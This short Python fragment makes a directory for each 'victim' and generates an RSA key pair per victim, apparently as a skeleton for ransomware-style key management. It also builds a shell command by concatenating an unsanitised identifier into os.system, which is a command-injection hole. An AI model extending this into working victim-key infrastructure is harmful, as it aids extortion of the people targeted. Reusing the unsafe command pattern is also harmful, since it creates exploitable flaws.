import os
from cryptography.hazmat.primitives.asymmetric import rsa

victim_id = "some unique id upon connection"
path_to_dirs = "/some/path/" # This needs to end in /

os.system("mkdir " + path_to_dirs + victim_id)

def generate_key_pair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )

    # Get the public key from the private key
    public_key = private_key.public_key()
    
    return private_key, public_key
